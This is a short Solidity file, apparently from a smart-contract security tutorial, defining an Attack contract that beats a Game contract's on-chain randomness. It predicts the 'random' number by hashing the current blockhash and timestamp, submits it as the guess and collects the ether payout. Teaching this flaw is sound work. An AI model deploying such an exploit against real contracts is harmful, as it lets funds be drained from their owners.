// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Game.sol";

contract Attack {
  Game game;

  /**
    Creates an instance of Game contract with the help of `gameAddress`
  */
  constructor(address gameAddress) {
    game = Game(gameAddress);
  }

  /**
    attacks the `Game` contract by guessing the exact number because `blockhash` and `block.timestamp`
    is accessible publically
  */
  function attack() public {
    uint _guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
    game.guess(_guess);
  }

  // Gets called when the contract recieves ether
  receive() external payable{}
}